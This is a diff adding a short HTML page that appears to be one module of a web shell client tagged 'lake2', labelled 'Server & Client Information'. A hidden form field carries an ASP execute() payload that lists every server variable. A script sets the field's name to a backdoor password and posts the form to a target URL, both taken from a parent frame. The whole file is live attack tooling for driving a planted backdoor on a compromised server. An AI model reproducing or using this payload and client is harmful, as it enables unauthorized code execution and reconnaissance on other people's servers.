@@ -1,0 +1,14 @@
+<link rel="stylesheet" type="text/css" href="lake2.css">
+<div align="center">Server & Client Information<br>
+You will can click 'Send' to get sth. info.
+</div>
+<form name="xform" method="post" target="_blank">
+<input type="hidden" name="code" value='execute("response.clear:StrResult=""<TABLE BORDER=1><TR><TD><B>Server Variable</B></TD><TD><B>Value</B></TD></TR>"":For Each strKey In Request.ServerVariables:StrResult=StrResult&""<TR><TD>""&strKey&""</TD><TD>""&Request.ServerVariables(strKey)&""</TD></TR>"":Next:StrResult=StrResult&""</TABLE>"":response.write(strResult):response.end")'>
+</form>
+<script>
+function RUNonclick(){
+document.xform.code.name = parent.pwd.value;
+document.xform.action = parent.url.value;
+document.xform.submit();
+}
+</script>
